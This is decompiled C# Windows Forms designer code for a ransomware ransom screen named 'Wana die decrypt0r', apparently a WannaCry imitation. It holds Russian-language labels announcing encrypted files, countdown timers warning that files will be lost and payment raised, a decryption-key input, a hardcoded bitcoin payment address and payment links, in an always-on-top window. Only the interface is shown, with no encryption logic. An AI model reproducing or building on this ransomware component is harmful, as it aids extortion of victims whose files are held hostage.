namespace Wana_Decrypt0r
{
	// Token: 0x02000003 RID: 3
	public partial class Form1 : global::System.Windows.Forms.Form
	{
		// Token: 0x0600001B RID: 27 RVA: 0x00002718 File Offset: 0x00000918
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.icontainer_0 != null)
			{
				this.icontainer_0.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00002744 File Offset: 0x00000944
		private void InitializeComponent()
		{
			this.icontainer_0 = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Wana_Decrypt0r.Form1));
			this.groupBox1 = new global::System.Windows.Forms.GroupBox();
			this.groupBox4 = new global::System.Windows.Forms.GroupBox();
			this.label10 = new global::System.Windows.Forms.Label();
			this.label9 = new global::System.Windows.Forms.Label();
			this.verticalProgressBar3 = new global::GClass0();
			this.label8 = new global::System.Windows.Forms.Label();
			this.label5 = new global::System.Windows.Forms.Label();
			this.label6 = new global::System.Windows.Forms.Label();
			this.groupBox3 = new global::System.Windows.Forms.GroupBox();
			this.verticalProgressBar1 = new global::GClass0();
			this.label7 = new global::System.Windows.Forms.Label();
			this.pictureBox1 = new global::System.Windows.Forms.PictureBox();
			this.label2 = new global::System.Windows.Forms.Label();
			this.label1 = new global::System.Windows.Forms.Label();
			this.groupBox2 = new global::System.Windows.Forms.GroupBox();
			this.verticalProgressBar2 = new global::GClass0();
			this.label3 = new global::System.Windows.Forms.Label();
			this.button3 = new global::System.Windows.Forms.Button();
			this.textBox1 = new global::System.Windows.Forms.TextBox();
			this.timer_0 = new global::System.Windows.Forms.Timer(this.icontainer_0);
			this.listBox1 = new global::System.Windows.Forms.ListBox();
			this.timer_1 = new global::System.Windows.Forms.Timer(this.icontainer_0);
			this.label4 = new global::System.Windows.Forms.Label();
			this.backgroundWorker_0 = new global::System.ComponentModel.BackgroundWorker();
			this.linkLabel1 = new global::System.Windows.Forms.LinkLabel();
			this.linkLabel2 = new global::System.Windows.Forms.LinkLabel();
			this.textBox3 = new global::System.Windows.Forms.TextBox();
			this.openFileDialog_0 = new global::System.Windows.Forms.OpenFileDialog();
			this.richTextBox1 = new global::System.Windows.Forms.RichTextBox();
			this.groupBox5 = new global::System.Windows.Forms.GroupBox();
			this.button1 = new global::System.Windows.Forms.Button();
			this.linkLabel3 = new global::System.Windows.Forms.LinkLabel();
			this.pictureBox2 = new global::System.Windows.Forms.PictureBox();
			this.groupBox1.SuspendLayout();
			this.groupBox4.SuspendLayout();
			this.groupBox3.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			this.groupBox2.SuspendLayout();
			this.groupBox5.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox2).BeginInit();
			this.SuspendLayout();
			this.groupBox1.BackColor = global::System.Drawing.Color.DarkRed;
			this.groupBox1.Controls.Add(this.groupBox4);
			this.groupBox1.Controls.Add(this.label5);
			this.groupBox1.Controls.Add(this.label6);
			this.groupBox1.Controls.Add(this.groupBox3);
			this.groupBox1.Controls.Add(this.pictureBox1);
			this.groupBox1.Controls.Add(this.label2);
			this.groupBox1.Controls.Add(this.label1);
			this.groupBox1.Controls.Add(this.groupBox2);
			this.groupBox1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.groupBox1.ForeColor = global::System.Drawing.Color.White;
			this.groupBox1.Location = new global::System.Drawing.Point(12, 1);
			this.groupBox1.Name = "groupBox1";
			this.groupBox1.Size = new global::System.Drawing.Size(235, 579);
			this.groupBox1.TabIndex = 0;
			this.groupBox1.TabStop = false;
			this.groupBox1.Text = "Информация";
			this.groupBox4.Controls.Add(this.label10);
			this.groupBox4.Controls.Add(this.label9);
			this.groupBox4.Controls.Add(this.verticalProgressBar3);
			this.groupBox4.Controls.Add(this.label8);
			this.groupBox4.Location = new global::System.Drawing.Point(6, 441);
			this.groupBox4.Name = "groupBox4";
			this.groupBox4.Size = new global::System.Drawing.Size(223, 125);
			this.groupBox4.TabIndex = 6;
			this.groupBox4.TabStop = false;
			this.label10.AutoSize = true;
			this.label10.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.label10.ForeColor = global::System.Drawing.Color.Yellow;
			this.label10.Location = new global::System.Drawing.Point(28, 19);
			this.label10.Name = "label10";
			this.label10.Size = new global::System.Drawing.Size(160, 15);
			this.label10.TabIndex = 8;
			this.label10.Text = "Утеря важного файла:";
			this.label9.AutoSize = true;
			this.label9.Font = new global::System.Drawing.Font("Palatino Linotype", 14.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.label9.ForeColor = global::System.Drawing.Color.LightYellow;
			this.label9.Location = new global::System.Drawing.Point(54, 80);
			this.label9.Name = "label9";
			this.label9.Size = new global::System.Drawing.Size(22, 26);
			this.label9.TabIndex = 8;
			this.label9.Text = "0";
			this.verticalProgressBar3.Location = new global::System.Drawing.Point(204, 16);
			this.verticalProgressBar3.Maximum = 70;
			this.verticalProgressBar3.Name = "verticalProgressBar3";
			this.verticalProgressBar3.Size = new global::System.Drawing.Size(14, 100);
			this.verticalProgressBar3.Step = 1;
			this.verticalProgressBar3.TabIndex = 5;
			this.label8.AutoSize = true;
			this.label8.Location = new global::System.Drawing.Point(52, 60);
			this.label8.Name = "label8";
			this.label8.Size = new global::System.Drawing.Size(118, 13);
			this.label8.TabIndex = 4;
			this.label8.Text = "Времени осталось";
			this.label5.AutoSize = true;
			this.label5.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.label5.ForeColor = global::System.Drawing.Color.Yellow;
			this.label5.Location = new global::System.Drawing.Point(23, 186);
			this.label5.Name = "label5";
			this.label5.Size = new global::System.Drawing.Size(175, 15);
			this.label5.TabIndex = 6;
			this.label5.Text = "Оплата будет повышена:";
			this.label6.AutoSize = true;
			this.label6.Font = new global::System.Drawing.Font("Palatino Linotype", 14.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.label6.ForeColor = global::System.Drawing.Color.LightYellow;
			this.label6.Location = new global::System.Drawing.Point(60, 246);
			this.label6.Name = "label6";
			this.label6.Size = new global::System.Drawing.Size(22, 26);
			this.label6.TabIndex = 5;
			this.label6.Text = "0";
			this.groupBox3.Controls.Add(this.verticalProgressBar1);
			this.groupBox3.Controls.Add(this.label7);
			this.groupBox3.Location = new global::System.Drawing.Point(6, 169);
			this.groupBox3.Name = "groupBox3";
			this.groupBox3.Size = new global::System.Drawing.Size(223, 125);
			this.groupBox3.TabIndex = 7;
			this.groupBox3.TabStop = false;
			this.verticalProgressBar1.Location = new global::System.Drawing.Point(203, 17);
			this.verticalProgressBar1.Maximum = 200400;
			this.verticalProgressBar1.Name = "verticalProgressBar1";
			this.verticalProgressBar1.Size = new global::System.Drawing.Size(14, 100);
			this.verticalProgressBar1.Step = 1;
			this.verticalProgressBar1.TabIndex = 4;
			this.label7.AutoSize = true;
			this.label7.Location = new global::System.Drawing.Point(52, 58);
			this.label7.Name = "label7";
			this.label7.Size = new global::System.Drawing.Size(118, 13);
			this.label7.TabIndex = 4;
			this.label7.Text = "Времени осталось";
			this.pictureBox1.BackColor = global::System.Drawing.Color.Transparent;
			this.pictureBox1.Image = global::Wana_Decrypt0r.Properties.Resources.smethod_6();
			this.pictureBox1.Location = new global::System.Drawing.Point(16, 14);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new global::System.Drawing.Size(193, 152);
			this.pictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.pictureBox1.TabIndex = 3;
			this.pictureBox1.TabStop = false;
			this.label2.AutoSize = true;
			this.label2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.label2.ForeColor = global::System.Drawing.Color.Yellow;
			this.label2.Location = new global::System.Drawing.Point(13, 322);
			this.label2.Name = "label2";
			this.label2.Size = new global::System.Drawing.Size(196, 15);
			this.label2.TabIndex = 1;
			this.label2.Text = "Ваши файлы будут утеряны:";
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Palatino Linotype", 14.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.label1.ForeColor = global::System.Drawing.Color.LightYellow;
			this.label1.Location = new global::System.Drawing.Point(60, 382);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(22, 26);
			this.label1.TabIndex = 0;
			this.label1.Text = "0";
			this.groupBox2.Controls.Add(this.verticalProgressBar2);
			this.groupBox2.Controls.Add(this.label3);
			this.groupBox2.Location = new global::System.Drawing.Point(6, 305);
			this.groupBox2.Name = "groupBox2";
			this.groupBox2.Size = new global::System.Drawing.Size(223, 125);
			this.groupBox2.TabIndex = 4;
			this.groupBox2.TabStop = false;
			this.verticalProgressBar2.Location = new global::System.Drawing.Point(204, 17);
			this.verticalProgressBar2.Maximum = 600400;
			this.verticalProgressBar2.Name = "verticalProgressBar2";
			this.verticalProgressBar2.Size = new global::System.Drawing.Size(14, 100);
			this.verticalProgressBar2.Step = 1;
			this.verticalProgressBar2.TabIndex = 5;
			this.label3.AutoSize = true;
			this.label3.Location = new global::System.Drawing.Point(52, 58);
			this.label3.Name = "label3";
			this.label3.Size = new global::System.Drawing.Size(118, 13);
			this.label3.TabIndex = 4;
			this.label3.Text = "Времени осталось";
			this.button3.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
			this.button3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.button3.ForeColor = global::System.Drawing.Color.Black;
			this.button3.Location = new global::System.Drawing.Point(693, 616);
			this.button3.Name = "button3";
			this.button3.Size = new global::System.Drawing.Size(145, 25);
			this.button3.TabIndex = 2;
			this.button3.Text = "Расшифровать";
			this.button3.UseVisualStyleBackColor = true;
			this.button3.Click += new global::System.EventHandler(this.button3_Click);
			this.textBox1.BackColor = global::System.Drawing.Color.DarkRed;
			this.textBox1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.textBox1.ForeColor = global::System.Drawing.Color.White;
			this.textBox1.Location = new global::System.Drawing.Point(403, 581);
			this.textBox1.Name = "textBox1";
			this.textBox1.Size = new global::System.Drawing.Size(241, 20);
			this.textBox1.TabIndex = 2;
			this.textBox1.Text = "Введите ключ расшифровки";
			this.textBox1.Click += new global::System.EventHandler(this.textBox1_Click);
			this.timer_0.Enabled = true;
			this.timer_0.Interval = 1000;
			this.timer_0.Tick += new global::System.EventHandler(this.timer_0_Tick);
			this.listBox1.FormattingEnabled = true;
			this.listBox1.Location = new global::System.Drawing.Point(254, 40);
			this.listBox1.Name = "listBox1";
			this.listBox1.Size = new global::System.Drawing.Size(584, 498);
			this.listBox1.TabIndex = 1;
			this.timer_1.Interval = 1;
			this.timer_1.Tick += new global::System.EventHandler(this.timer_1_Tick);
			this.label4.AutoSize = true;
			this.label4.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 14.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.label4.ForeColor = global::System.Drawing.Color.White;
			this.label4.Location = new global::System.Drawing.Point(377, 10);
			this.label4.Name = "label4";
			this.label4.Size = new global::System.Drawing.Size(351, 24);
			this.label4.TabIndex = 2;
			this.label4.Text = "Файлы зашифрованы, что делать?";
			this.backgroundWorker_0.WorkerSupportsCancellation = true;
			this.backgroundWorker_0.DoWork += new global::System.ComponentModel.DoWorkEventHandler(this.backgroundWorker_0_DoWork);
			this.linkLabel1.ActiveLinkColor = global::System.Drawing.Color.Yellow;
			this.linkLabel1.AutoSize = true;
			this.linkLabel1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.linkLabel1.LinkColor = global::System.Drawing.Color.CornflowerBlue;
			this.linkLabel1.Location = new global::System.Drawing.Point(13, 583);
			this.linkLabel1.Name = "linkLabel1";
			this.linkLabel1.Size = new global::System.Drawing.Size(126, 13);
			this.linkLabel1.TabIndex = 4;
			this.linkLabel1.TabStop = true;
			this.linkLabel1.Text = "Что такое биткоин?";
			this.linkLabel1.LinkClicked += new global::System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
			this.linkLabel2.ActiveLinkColor = global::System.Drawing.Color.Yellow;
			this.linkLabel2.AutoSize = true;
			this.linkLabel2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.linkLabel2.LinkColor = global::System.Drawing.Color.CornflowerBlue;
			this.linkLabel2.Location = new global::System.Drawing.Point(13, 600);
			this.linkLabel2.Name = "linkLabel2";
			this.linkLabel2.Size = new global::System.Drawing.Size(145, 13);
			this.linkLabel2.TabIndex = 5;
			this.linkLabel2.TabStop = true;
			this.linkLabel2.Text = "Перечислить биткоины";
			this.linkLabel2.LinkClicked += new global::System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel2_LinkClicked);
			this.textBox3.BackColor = global::System.Drawing.Color.DarkRed;
			this.textBox3.Cursor = global::System.Windows.Forms.Cursors.Arrow;
			this.textBox3.Font = new global::System.Drawing.Font("Verdana", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.textBox3.ForeColor = global::System.Drawing.Color.White;
			this.textBox3.Location = new global::System.Drawing.Point(403, 552);
			this.textBox3.Name = "textBox3";
			this.textBox3.ReadOnly = true;
			this.textBox3.Size = new global::System.Drawing.Size(337, 21);
			this.textBox3.TabIndex = 6;
			this.textBox3.Text = "1Dowv8DTWhRk6xQmuWrEDipgCc83VTKbYT";
			this.openFileDialog_0.FileName = "openFileDialog1";
			this.richTextBox1.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.richTextBox1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.richTextBox1.Location = new global::System.Drawing.Point(254, 41);
			this.richTextBox1.Name = "richTextBox1";
			this.richTextBox1.Size = new global::System.Drawing.Size(584, 497);
			this.richTextBox1.TabIndex = 8;
			this.richTextBox1.Text = componentResourceManager.GetString("richTextBox1.Text");
			this.groupBox5.Controls.Add(this.button1);
			this.groupBox5.Location = new global::System.Drawing.Point(253, 538);
			this.groupBox5.Name = "groupBox5";
			this.groupBox5.Size = new global::System.Drawing.Size(585, 72);
			this.groupBox5.TabIndex = 9;
			this.groupBox5.TabStop = false;
			this.button1.Location = new global::System.Drawing.Point(494, 14);
			this.button1.Name = "button1";
			this.button1.Size = new global::System.Drawing.Size(86, 21);
			this.button1.TabIndex = 0;
			this.button1.Text = "Копировать";
			this.button1.UseVisualStyleBackColor = true;
			this.button1.Click += new global::System.EventHandler(this.button1_Click);
			this.linkLabel3.ActiveLinkColor = global::System.Drawing.Color.Yellow;
			this.linkLabel3.AutoSize = true;
			this.linkLabel3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 204);
			this.linkLabel3.LinkColor = global::System.Drawing.Color.CornflowerBlue;
			this.linkLabel3.Location = new global::System.Drawing.Point(13, 617);
			this.linkLabel3.Name = "linkLabel3";
			this.linkLabel3.Size = new global::System.Drawing.Size(141, 13);
			this.linkLabel3.TabIndex = 10;
			this.linkLabel3.TabStop = true;
			this.linkLabel3.Text = "Связаться с помощью";
			this.linkLabel3.LinkClicked += new global::System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel3_LinkClicked);
			this.pictureBox2.Image = global::Wana_Decrypt0r.Properties.Resources.smethod_4();
			this.pictureBox2.Location = new global::System.Drawing.Point(257, 552);
			this.pictureBox2.Name = "pictureBox2";
			this.pictureBox2.Size = new global::System.Drawing.Size(143, 49);
			this.pictureBox2.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.pictureBox2.TabIndex = 7;
			this.pictureBox2.TabStop = false;
			this.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			this.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.AutoSizeMode = global::System.Windows.Forms.AutoSizeMode.GrowAndShrink;
			this.BackColor = global::System.Drawing.Color.DarkRed;
			this.ClientSize = new global::System.Drawing.Size(850, 644);
			this.Controls.Add(this.linkLabel3);
			this.Controls.Add(this.richTextBox1);
			this.Controls.Add(this.pictureBox2);
			this.Controls.Add(this.textBox3);
			this.Controls.Add(this.linkLabel2);
			this.Controls.Add(this.linkLabel1);
			this.Controls.Add(this.button3);
			this.Controls.Add(this.label4);
			this.Controls.Add(this.textBox1);
			this.Controls.Add(this.listBox1);
			this.Controls.Add(this.groupBox1);
			this.Controls.Add(this.groupBox5);
			this.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.FixedToolWindow;
			this.MaximizeBox = false;
			this.MinimizeBox = false;
			this.Name = "Form1";
			this.ShowIcon = false;
			this.ShowInTaskbar = false;
			this.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Wana die decrypt0r";
			this.TopMost = true;
			this.Load += new global::System.EventHandler(this.Form1_Load);
			this.groupBox1.ResumeLayout(false);
			this.groupBox1.PerformLayout();
			this.groupBox4.ResumeLayout(false);
			this.groupBox4.PerformLayout();
			this.groupBox3.ResumeLayout(false);
			this.groupBox3.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			this.groupBox2.ResumeLayout(false);
			this.groupBox2.PerformLayout();
			this.groupBox5.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox2).EndInit();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		// Token: 0x04000008 RID: 8
		private global::System.ComponentModel.IContainer icontainer_0;

		// Token: 0x04000009 RID: 9
		private global::System.Windows.Forms.GroupBox groupBox1;

		// Token: 0x0400000A RID: 10
		private global::System.Windows.Forms.Timer timer_0;

		// Token: 0x0400000B RID: 11
		private global::System.Windows.Forms.Label label1;

		// Token: 0x0400000C RID: 12
		private global::System.Windows.Forms.Label label2;

		// Token: 0x0400000D RID: 13
		private global::System.Windows.Forms.ListBox listBox1;

		// Token: 0x0400000E RID: 14
		private global::System.Windows.Forms.Timer timer_1;

		// Token: 0x0400000F RID: 15
		private global::System.Windows.Forms.Button button3;

		// Token: 0x04000010 RID: 16
		private global::System.Windows.Forms.TextBox textBox1;

		// Token: 0x04000011 RID: 17
		private global::System.Windows.Forms.Label label4;

		// Token: 0x04000012 RID: 18
		private global::System.Windows.Forms.PictureBox pictureBox1;

		// Token: 0x04000013 RID: 19
		private global::System.Windows.Forms.GroupBox groupBox2;

		// Token: 0x04000014 RID: 20
		private global::System.Windows.Forms.Label label3;

		// Token: 0x04000015 RID: 21
		private global::System.Windows.Forms.Label label5;

		// Token: 0x04000016 RID: 22
		private global::System.Windows.Forms.Label label6;

		// Token: 0x04000017 RID: 23
		private global::System.Windows.Forms.GroupBox groupBox3;

		// Token: 0x04000018 RID: 24
		private global::System.Windows.Forms.Label label7;

		// Token: 0x04000019 RID: 25
		private global::System.ComponentModel.BackgroundWorker backgroundWorker_0;

		// Token: 0x0400001A RID: 26
		private global::GClass0 verticalProgressBar1;

		// Token: 0x0400001B RID: 27
		private global::GClass0 verticalProgressBar2;

		// Token: 0x0400001C RID: 28
		private global::System.Windows.Forms.LinkLabel linkLabel1;

		// Token: 0x0400001D RID: 29
		private global::System.Windows.Forms.LinkLabel linkLabel2;

		// Token: 0x0400001E RID: 30
		private global::System.Windows.Forms.TextBox textBox3;

		// Token: 0x0400001F RID: 31
		private global::System.Windows.Forms.GroupBox groupBox4;

		// Token: 0x04000020 RID: 32
		private global::System.Windows.Forms.Label label10;

		// Token: 0x04000021 RID: 33
		private global::System.Windows.Forms.Label label9;

		// Token: 0x04000022 RID: 34
		private global::GClass0 verticalProgressBar3;

		// Token: 0x04000023 RID: 35
		private global::System.Windows.Forms.Label label8;

		// Token: 0x04000024 RID: 36
		private global::System.Windows.Forms.PictureBox pictureBox2;

		// Token: 0x04000025 RID: 37
		private global::System.Windows.Forms.OpenFileDialog openFileDialog_0;

		// Token: 0x04000026 RID: 38
		private global::System.Windows.Forms.RichTextBox richTextBox1;

		// Token: 0x04000027 RID: 39
		private global::System.Windows.Forms.GroupBox groupBox5;

		// Token: 0x04000028 RID: 40
		private global::System.Windows.Forms.Button button1;

		// Token: 0x04000029 RID: 41
		private global::System.Windows.Forms.LinkLabel linkLabel3;
	}
}
